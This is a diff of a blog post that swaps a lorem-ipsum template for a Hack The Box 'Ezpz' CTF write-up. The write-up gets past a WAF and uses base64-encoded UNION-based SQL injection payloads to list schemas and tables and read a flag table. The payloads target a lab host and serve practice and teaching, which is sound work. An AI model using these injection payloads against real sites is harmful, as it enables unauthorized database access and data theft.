@@ -1,135 +1,70 @@
 ---
 date: 2019-05-12T19:17:18.000Z
 layout: post
-title: Far far away behind the word mountains
-subtitle: Lorem ipsum dolor sit amet, consectetur adipisicing elit.
+title: Ezpz Web Challenge Write Up From Hack The Box
+subtitle: Its an easy web challenge, and we will butch it
 description: >-
   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
   tempor incididunt ut labore et dolore magna aliqua.
 image: >-
-  https://res.cloudinary.com/dm7h7e8xj/image/upload/v1559821648/theme5_wmutla.jpg
+  https://i.imgur.com/XnJ1KF4.png
 optimized_image: >-
-  https://res.cloudinary.com/dm7h7e8xj/image/upload/c_scale,w_380/v1559821648/theme5_wmutla.jpg
-category: travel
+  https://i.imgur.com/XnJ1KF4.png
+category: web 
 tags:
-  - mountains
-  - travel
-  - adventure
-author: thiagorossener
+  - web
+  - sqli
+  - php
+author: Dr.D3xt3r
 paginate: true
 ---
-Cas sociis natoque penatibus et magnis <a href="#">dis parturient montes</a>, nascetur ridiculus mus. _Aenean eu leo quam._ Pellentesque ornare sem lacinia quam venenatis vestibulum. Sed posuere consectetur est at lobortis. Cras mattis consectetur purus sit amet fermentum.
+## first Part 
 
-> Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.
+i open the challenge its an error lets see what we will do .
 
-Etiam porta **sem malesuada magna** mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.
+![placeholder](https://i.imgur.com/qxWpyff.png)
 
---page-break--
+lets put any value in obj : `<http://docker.hackthebox.eu:30268/?obj=1>`
 
-## Inline HTML elements
+![placeholder](https://i.imgur.com/HA1dt1Z.png)
 
-HTML defines a long list of available inline tags, a complete list of which can be found on the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTML/Element).
+nice its work .. lets determine 'id' property : `<http://docker.hackthebox.eu:30268/?obj[id]=1>`
 
-* **To bold text**, use `<strong>`.
-* _To italicize text_, use `<em>`.
-* Abbreviations, like <abbr title="HyperText Markup Langage">HTML</abbr> should use `<abbr>`, with an optional `title` attribute for the full phrase.
-* Citations, like <cite>&mdash; Thiago Rossener</cite>, should use `<cite>`.
-* <del>Deleted</del> text should use `<del>` and <ins>inserted</ins> text should use `<ins>`.
-* Superscript <sup>text</sup> uses `<sup>` and subscript <sub>text</sub> uses `<sub>`.
+![placeholder](https://i.imgur.com/ErPIhyx.png)
 
-Most of these elements are styled by browsers with few modifications on our part.
+okaaai .. its take any input and decode it to base64 , so lets encode this `<{"ID": "1"}>`
+`<http://docker.hackthebox.eu:30268/?obj=eyAiSUQiOiAiMSJ9>`
 
---page-break--
+![placeholder](https://i.imgur.com/MkEjV2Z.png)
 
-# Heading 1
+niiice its first part of challenge and its easy . lets see what we will do next 
 
-## Heading 2
+## Second Part : SQLI
 
-### Heading 3
+its being filterd by `<WAF>` so lets bypass it 
 
-#### Heading 4
+![placeholder](https://i.imgur.com/UAB6mFx.png)
 
-Vivamus sagittis lacus vel augue rutrum faucibus dolor auctor. Duis mollis, est non commodo luctus, nisi erat porttitor ligula, eget lacinia odio sem nec elit. Morbi leo risus, porta ac consectetur ac, vestibulum at eros.
+I tried this payload `<{"ID": "a' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b -- a"}>` 
 
-## Code
+and encode it 
 
-Cum sociis natoque penatibus et magnis dis `code element` montes, nascetur ridiculus mus.
+`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSliIC0tIGEifQ==>`
 
-```js
-// Example can be run directly in your JavaScript console
+![placeholder](https://i.imgur.com/5EswifW.png)
 
-// Create a function that takes two arguments and returns the sum of those arguments
-var adder = new Function("a", "b", "return a + b");
+niice its working its display > "information schema tables"
 
-// Call the function
-adder(2, 6);
-// > 8
-```
+lets dipaly names of the tables : 
 
-Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa.
+`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCB0YWJsZV9uYW1lIEZST00gbXlzcWwuaW5ub2RiX3RhYmxlX3N0YXRzKWIgLS0gYSJ9>`
 
-## Lists
+![placeholder](https://i.imgur.com/PlHywd8.png)
 
-Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aenean lacinia bibendum nulla sed consectetur. Etiam porta sem malesuada magna mollis euismod. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.
+here we go we get the flag table 
 
-* Praesent commodo cursus magna, vel scelerisque nisl consectetur et.
-* Donec id elit non mi porta gravida at eget metus.
-* Nulla vitae elit libero, a pharetra augue.
+`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJ1VOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCAxKWEgSk9JTiAoc2VsZWN0ICogZnJvbSBGbGFnVGFibGVVbmd1ZXNzYWJsZUV6UFopYiAtLSBhIn0>`
 
-Donec ullamcorper nulla non metus auctor fringilla. Nulla vitae elit libero, a pharetra augue.
+![placeholder](https://i.imgur.com/CUkmWhm.png)
 
-1. Vestibulum id ligula porta felis euismod semper.
-2. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
-3. Maecenas sed diam eget risus varius blandit sit amet non magna.
-
-Cras mattis consectetur purus sit amet fermentum. Sed posuere consectetur est at lobortis.
-
-Integer posuere erat a ante venenatis dapibus posuere velit aliquet. Morbi leo risus, porta ac consectetur ac, vestibulum at eros. Nullam quis risus eget urna mollis ornare vel eu leo.
-
-## Images
-
-Quisque consequat sapien eget quam rhoncus, sit amet laoreet diam tempus. Aliquam aliquam metus erat, a pulvinar turpis suscipit at.
-
-![placeholder](https://placehold.it/800x400 "Large example image")
-![placeholder](https://placehold.it/400x200 "Medium example image")
-![placeholder](https://placehold.it/200x200 "Small example image")
-
-## Tables
-
-Aenean lacinia bibendum nulla sed consectetur. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
-
-<table>
-  <thead>
-    <tr>
-      <th>Name</th>
-      <th>Upvotes</th>
-      <th>Downvotes</th>
-    </tr>
-  </thead>
-  <tfoot>
-    <tr>
-      <td>Totals</td>
-      <td>21</td>
-      <td>23</td>
-    </tr>
-  </tfoot>
-  <tbody>
-    <tr>
-      <td>Alice</td>
-      <td>10</td>
-      <td>11</td>
-    </tr>
-    <tr>
-      <td>Bob</td>
-      <td>4</td>
-      <td>3</td>
-    </tr>
-    <tr>
-      <td>Charlie</td>
-      <td>7</td>
-      <td>9</td>
-    </tr>
-  </tbody>
-</table>
-
-Nullam id dolor id nibh ultricies vehicula ut id elit. Sed posuere consectetur est at lobortis. Nullam quis risus eget urna mollis ornare vel eu leo.
+GG bro its so easy .. hope its clear to u thanks for reading <3
